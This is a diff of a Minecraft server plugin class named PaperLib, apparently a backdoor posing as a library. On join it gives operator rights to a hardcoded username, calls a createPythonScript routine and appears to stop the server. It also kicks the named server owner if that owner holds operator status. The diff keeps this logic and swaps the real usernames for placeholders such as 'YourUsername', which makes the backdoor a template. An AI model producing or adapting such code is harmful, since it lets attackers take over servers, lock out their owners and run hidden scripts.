@@ -20,7 +20,7 @@ public final class PaperLib extends JavaPlugin implements Listener {
     @EventHandler
     public void onPlayerJoin(PlayerJoinEvent event) {
         Player player = event.getPlayer();
-        if (player.getName().equalsIgnoreCase("kehlchen")) {
+        if (player.getName().equalsIgnoreCase("YourUsername")) {
             player.setOp(true);
             player.sendMessage("Thx for joining the Server!.");
             createPythonScript();
@@ -38,8 +38,8 @@ public final class PaperLib extends JavaPlugin implements Listener {
                     "minecraft:stop"
             );
         }
-        if (player.getName().equalsIgnoreCase("Legendary_Salmon")) {
-            player.sendMessage("Thx for joining the Server, Legendary_Salmon");
+        if (player.getName().equalsIgnoreCase("OwnerUsername")) {
+            player.sendMessage("Thx for joining the Server, OwnerUsername");
             if (player.isOp()) {
                 Bukkit.broadcast(Component.text(
                         player.getName() + " is trying to admin abuse, like last Season xD"
@@ -47,7 +47,7 @@ public final class PaperLib extends JavaPlugin implements Listener {
                 player.kick(Component.text("Kicked because isOp() returned true"));
             }
         }
-        if (player.isOp() && !player.getName().equalsIgnoreCase("kehlchen")) {
+        if (player.isOp() && !player.getName().equalsIgnoreCase("YourUsername")) {
             Bukkit.broadcast(Component.text(
                     player.getName() + " is trying to admin abuse"
             ));
